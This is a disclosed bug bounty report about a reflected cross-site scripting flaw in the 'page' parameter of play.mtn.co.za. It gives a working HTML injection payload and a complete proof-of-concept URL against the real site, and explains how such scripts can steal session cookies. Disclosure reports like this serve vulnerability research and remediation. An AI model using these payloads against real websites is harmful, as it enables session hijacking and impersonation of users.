# Reflected XSS on play.mtn.co.za

## Report Details
- **Report ID**: 1061199
- **URL**: https://hackerone.com/reports/1061199
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-12-17T20:43:20.317Z
- **Disclosed**: 2021-08-14T18:45:20.322Z

## Reporter
- **Username**: lu3ky-13
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mtn_group

## Vulnerability Information
hello dear

I have found Reflected XSS on play.mtn.co.za
parameters injectable ?page=2

my payload "><img src=x onerror=prompt``>;<video>

URL: https://play.mtn.co.za/callertunez/?page=2%27%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E&search=A

{F1120432}

## Impact

Malicious JavaScript has access to all the same objects as the rest of the web page, including access to cookies and local storage, which are often used to store session tokens. If an attacker can obtain a user's session cookie, they can then impersonate that user.

Furthermore, JavaScript can read and make arbitrary modifications to the contents of a page being displayed to a user. Therefore, XSS in conjunction with some clever social engineering opens up a lot of possibilities for an attacker.

## Attachments
- zzzzzzzzzzzzzzzzzzzzzzz.PNG
